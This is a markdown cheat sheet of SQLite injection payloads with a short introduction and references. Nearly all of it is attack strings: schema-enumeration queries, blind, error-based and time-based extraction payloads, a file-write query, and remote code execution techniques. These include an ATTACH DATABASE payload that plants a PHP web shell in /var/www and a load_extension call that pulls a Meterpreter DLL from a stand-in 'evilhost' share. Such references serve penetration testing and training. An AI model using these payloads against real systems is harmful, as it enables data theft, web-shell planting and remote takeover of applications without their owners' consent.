# sqlite injection

> sqlite injection  is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious sql code into sql queries executed by an sqlite database. this vulnerability arises when user inputs are integrated into sql statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. such injections can lead to unauthorized data access, data manipulation, and other severe security issues. 


## summary

* [sqlite comments](#sqlite-comments)
* [sqlite enumeration](#sqlite-enumeration)
* [sqlite string](#sqlite-string)
    * [sqlite string methodology](#sqlite-string-methodology)
* [sqlite blind](#sqlite-blind)
    * [sqlite blind methodology](#sqlite-blind-methodology)
    * [sqlite blind with substring equivalent](#sqlite-blind-with-substring-equivalent)
* [sqlite error based](#sqlite-error-based)
* [sqlite time based](#sqlite-time-based)
* [sqlite remote code execution](#sqlite-remote-code-execution)
    * [attach database](#attach-database)
    * [load_extension](#load_extension)
* [sqlite file manipulation](#sqlite-file-manipulation)
    * [sqlite read file](#sqlite-read-file)
    * [sqlite write file](#sqlite-write-file)
* [references](#references)


## sqlite comments

| description         | comment |
| ------------------- | ------- |
| single-line comment | `--`    |
| multi-line comment  | `/**/`  |


## sqlite enumeration

| description   | sql query |
| ------------- | ----------------------------------------- |
| dbms version  | `select sqlite_version();`                |


## sqlite string

### sqlite string methodology

| description             | sql query                                 |
| ----------------------- | ----------------------------------------- | 
| extract database structure                           | `select sql from sqlite_schema` |
| extract database structure (sqlite_version > 3.33.0) | `select sql from sqlite_master` |
| extract table name  | `select tbl_name from sqlite_master where type='table'` |
| extract table name  | `select group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'` |
| extract column name | `select sql from sqlite_master where type!='meta' and sql not null and name ='table_name'` |
| extract column name | `select group_concat(name) as column_names from pragma_table_info('table_name');` |
| extract column name | `select max(sql) from sqlite_master where tbl_name='<table_name>'` |
| extract column name | `select name from pragma_table_info('<table_name>')` |


## sqlite blind

### sqlite blind methodology

| description             | sql query                                 |
| ----------------------- | ----------------------------------------- | 
| count number of tables  | `and (select count(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' ) < number_of_table` | 
| enumerating table name  | `and (select length(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number` | 
| extract info            | `and (select hex(substr(tbl_name,1,1)) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0) > hex('some_char')` | 
| extract info (order by) | `case when (select hex(substr(sql,1,1)) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0) = hex('some_char') then <order_element_1> else <order_element_2> end` | 


### sqlite blind with substring equivalent

| function    | example                                   |
| ----------- | ----------------------------------------- | 
| `substring` | `substring('foobar', <start>, <length>)`  | 
| `substr`    | `substr('foobar', <start>, <length>)`     | 


## sqlite error based

```sql
and case when [boolean_query] then 1 else load_extension(1) end
```


## sqlite time based

```sql
and [randnum]=like('abcdefg',upper(hex(randomblob([sleeptime]00000000/2))))
and 1337=like('abcdefg',upper(hex(randomblob(1000000000/2))))
```


## sqlite remote code execution

### attach database

```sql
attach database '/var/www/lol.php' as lol;
create table lol.pwn (dataz text);
insert into lol.pwn (dataz) values ("<?php system($_get['cmd']); ?>");--
```

### load_extension

:warning: this component is disabled by default.

```sql
union select 1,load_extension('\\evilhost\evilshare\meterpreter.dll','dllmain');--
```


## sqlite file manipulation

### sqlite read file

sqlite does not support file i/o operations by default.


### sqlite write file

```sql
select writefile('/path/to/file', column_name) from table_name
```


## references

* [injecting sqlite database based application - manish kishan tanwar - february 14, 2017](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
* [sqlite error based injection for enumeration - rio asmara suryadi - february 6, 2021](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
* [sqlite3 injection cheat sheet - nickosaurus hax - may 31, 2012](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
